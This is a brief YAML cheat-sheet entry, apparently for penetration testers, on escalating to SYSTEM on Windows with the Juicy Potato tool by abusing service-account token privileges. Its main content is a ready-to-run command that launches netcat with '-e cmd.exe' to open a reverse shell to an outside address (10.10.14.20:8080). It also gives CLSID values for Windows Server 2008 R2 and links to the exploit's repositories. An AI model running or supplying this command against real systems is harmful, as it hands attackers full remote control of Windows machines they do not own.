---
functions:
  privilege-escalation:
    - description: Leverage a service account with impersonatetoken  and assignprimarytoken to get system
      code: |
        C:\ColdFusion8\runtime\bin>jp.exe -t * -p nc.exe -a "10.10.14.20 8080 -e cmd.exe" -c {e60687f7-01a1-40aa-86ac-db1cbf673334} -l 13337

        Common CLSID:
        2008 R2 Standard
        winmgmt {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
        BITS {69AD4AEE-51BE-439b-A92C-86AE490E8B30}

resources: |
  https://github.com/ohpe/juicy-potato
  https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
  https://github.com/ivanitlearning/Juicy-Potato-x86/releases/tag/1.2
---
